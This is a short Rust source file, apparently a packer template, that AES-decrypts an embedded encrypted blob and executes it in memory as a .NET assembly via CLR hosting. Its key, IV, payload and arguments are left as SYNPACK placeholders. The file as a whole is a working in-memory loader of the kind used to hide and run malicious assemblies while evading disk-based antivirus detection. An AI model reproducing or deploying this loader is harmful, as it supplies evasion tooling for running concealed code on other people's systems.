use aes::cipher::{KeyIvInit, BlockDecryptMut, block_padding::Pkcs7};
use clroxide::clr::Clr;

fn decrypt_aes(buf: &mut Vec<u8>) {

    let key: [u8; 16] = [SYNPACK_KEY];
    let iv: [u8; 16]  = [SYNPACK_IV];

    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(buf.as_mut_slice()).unwrap();
}

fn main() {

    let mut bin_data: Vec<u8> = vec![SYNPACK_DATA];

    let args: Vec<String> = vec![SYNPACK_ARGS];
    
    decrypt_aes(&mut bin_data);
    let mut clr: Clr = Clr::new(bin_data, args).unwrap();

    let result: String = clr.run().unwrap();

    println!("{}", result);
}